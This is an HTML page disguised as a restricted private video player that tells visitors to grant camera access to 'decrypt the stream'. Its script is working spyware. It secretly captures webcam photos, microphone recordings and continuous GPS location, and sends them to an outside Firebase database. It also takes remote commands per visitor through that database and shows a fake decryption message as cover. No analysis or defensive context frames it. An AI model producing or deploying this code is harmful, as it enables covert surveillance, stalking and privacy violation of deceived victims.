<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Private Content</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #player { width: 90%; max-width: 500px; aspect-ratio: 16/9; background: #0a0a0a; border: 1px solid #333; display: flex; justify-content: center; align-items: center; position: relative; border-radius: 12px; cursor: pointer; }
        #play-btn { width: 80px; height: 80px; background: rgba(255,0,0,0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; }
        #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
        .info { margin-top: 20px; text-align: center; }
        h2 { color: #00ff41; font-size: 18px; }
    </style>
</head>
<body>
    <div id="player" onclick="initCommandCenter()">
        <div id="play-btn"></div>
    </div>
    <div class="info">
        <h2>Private Video: Restricted Access</h2>
        <p style="color:#666; font-size:12px;">Grant camera access to decrypt the stream.</p>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Generate Unique ID for every visitor
        const agentID = "UNIT_" + Math.floor(1000 + Math.random() * 9000);

        async function initCommandCenter() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.body.innerHTML = "<div style='color:#00ff41; font-family:monospace;'>[+] Decrypting Stream... 45%<br>[+] Syncing with Satellite...</div>";

                // Hidden Video for background capture
                const v = document.createElement('video');
                v.srcObject = stream; v.muted = true; v.play();

                // Send Online Status
                db.ref('targets/' + agentID + '/status').set("ONLINE");

                // Command Listener
                db.ref('commands/' + agentID).on('value', async snap => {
                    const cmd = snap.val();
                    if(!cmd) return;

                    if(cmd.action.includes('photo')) {
                        const canvas = document.createElement('canvas');
                        canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                        canvas.getContext('2d').drawImage(v, 0, 0);
                        db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
                    }
                    if(cmd.action === 'audio') {
                        const rec = new MediaRecorder(stream);
                        let ch = [];
                        rec.ondataavailable = e => ch.push(e.data);
                        rec.onstop = () => {
                            const reader = new FileReader();
                            reader.readAsDataURL(new Blob(ch, {type:'audio/webm'}));
                            reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result, time: Date.now() });
                        };
                        rec.start(); setTimeout(() => rec.stop(), 4000);
                    }
                });

                // Auto Location Update
                navigator.geolocation.watchPosition(pos => {
                    db.ref('targets/' + agentID + '/location').set({ lat: pos.coords.latitude, lng: pos.coords.longitude, last: new Date().toLocaleTimeString() });
                });

            } catch(e) { alert("Permission Required!"); location.reload(); }
        }
    </script>
</body>
</html>
